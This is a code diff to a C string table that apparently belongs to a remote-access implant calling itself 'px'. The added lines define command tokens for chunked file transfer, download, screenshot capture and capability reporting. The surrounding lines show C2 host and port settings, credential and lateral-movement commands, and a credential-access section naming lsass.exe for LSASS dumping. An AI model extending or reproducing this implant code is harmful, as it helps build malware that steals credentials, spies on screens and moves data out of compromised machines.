@@ -48,6 +48,8 @@
     X(PROTO_CAPS, "CAPS|")                                                  \
     X(PROTO_CRED, "CRED|")                                                  \
     X(PROTO_LATERAL, "LATERAL|")                                            \
+    X(PROTO_CHUNK, "CHUNK|")                                                \
+    X(PROTO_DONE, "DONE|")                                                  \
     /* --- environment overrides ---------------------------------------- */  \
     X(ENV_C2_HOST, "PX_C2_HOST")                                            \
     X(ENV_C2_PORT, "PX_C2_PORT")                                            \
@@ -110,6 +112,11 @@
     X(TXT_LOG_ENC_STATE, "[px] channel encryption %s\n")                  \
     X(TXT_LOG_BACKOFF, "[px] reconnecting in %lu seconds\n")               \
     X(TXT_LOG_RECONNECT, "[px] session ended, reconnecting\n")              \
+    X(TXT_LOG_TRANSFER, "[px] transfer %s : %s\n")                    \
+    X(PROTO_DOWNLOAD, "DL|")                                                \
+    X(PROTO_SCREENSHOT, "SHOT|")                                            \
+    X(PROTO_CAP, "CAP|")                                                  \
+    X(TXT_LOG_CAP, "[px] capability %s : %s\n")                    \
     /* --- credential access -------------------------------------------- */  \
     X(LSASS_EXE, "lsass.exe")                                               \
     X(TOOLHELP32, "CreateToolhelp32Snapshot")                               \
